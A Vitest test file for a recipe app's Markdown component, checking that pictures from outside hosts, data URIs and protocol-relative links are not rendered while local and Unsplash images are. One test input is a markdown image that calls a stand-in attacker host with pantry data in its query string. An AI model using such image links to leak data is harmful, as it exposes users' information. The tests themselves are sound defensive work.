import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { Markdown } from './Markdown.tsx';

const render = (markdown: string) => renderToStaticMarkup(<Markdown>{markdown}</Markdown>);

describe('pictures in recipe text', () => {
  it('never loads one from elsewhere, showing its caption instead', () => {
    const html = render('Stir. ![a photo](https://evil.example/x.png?pantry=eggs,flour)');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('evil.example');
    expect(html).toContain('a photo');
  });

  it('refuses data and protocol-relative pictures too', () => {
    expect(render('![x](data:image/png;base64,AAAA)')).not.toContain('<img');
    expect(render('![x](//evil.example/x.png)')).not.toContain('<img');
  });

  it('keeps the family’s photos and Unsplash', () => {
    expect(render('![soup](/media/soup-1.webp)')).toContain('<img');
    expect(render('![soup](https://images.unsplash.com/photo-1?w=100)')).toContain('<img');
  });

  it('leaves ordinary text alone', () => {
    expect(render('**Boil** the water')).toContain('<strong>Boil</strong>');
  });
});
